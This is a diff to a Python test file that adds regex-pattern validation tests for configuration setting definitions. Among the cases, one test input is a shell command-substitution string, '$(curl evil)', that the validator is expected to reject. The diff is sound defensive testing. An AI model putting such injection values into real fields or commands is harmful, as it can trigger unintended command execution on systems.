@@ -153,6 +153,8 @@ def test_catalog_uses_declarative_definitions() -> None:
         {"name": "mode", "type": "boolean", "default": "true"},
         {"name": "mode", "type": "enum", "choices": ("x",), "default": "y"},
         {"name": "token", "type": "string", "secret": True},
+        {"name": "mode", "type": "boolean", "pattern": "^x$"},
+        {"name": "mode", "type": "string", "pattern": "["},
     ],
 )
 def test_setting_definition_rejects_invalid_shapes(data: dict[str, object]) -> None:
@@ -239,6 +241,11 @@ def test_resolution_rejects_invalid_profiles_and_settings() -> None:
 def test_setting_value_validation_covers_closed_setting_types() -> None:
     boolean = SettingDefinition(name="enabled", type="boolean", default=False)
     enum = SettingDefinition(name="mode", type="enum", choices=("a",))
+    patterned = SettingDefinition(
+        name="cache_name",
+        type="string",
+        pattern=r"^[A-Za-z0-9][A-Za-z0-9._-]*$",
+    )
     secret = SettingDefinition.model_construct(
         name="secret",
         type="string",
@@ -246,6 +253,7 @@ def test_setting_value_validation_covers_closed_setting_types() -> None:
         default="x",
         choices=(),
         secret=True,
+        pattern=None,
     )
     assert _setting_value(boolean, {}) == Ok(False)
     assert (
@@ -274,6 +282,17 @@ def test_setting_value_validation_covers_closed_setting_types() -> None:
     assert (
         _failure(_setting_value(SettingDefinition(name="name", type="string"), {})).kind
         is ResolutionErrorKind.UNDETERMINED_SETTING
+    )
+    # Patterned string settings reject shell metacharacters and stray
+    # whitespace after normalization.
+    assert _setting_value(patterned, {"cache_name": " my-cache_1"}) == Ok("my-cache_1")
+    assert (
+        _failure(_setting_value(patterned, {"cache_name": "$(curl evil)"})).kind
+        is ResolutionErrorKind.PATTERN_VIOLATION
+    )
+    assert (
+        _failure(_setting_value(patterned, {"cache_name": "two words"})).kind
+        is ResolutionErrorKind.PATTERN_VIOLATION
     )
 
 
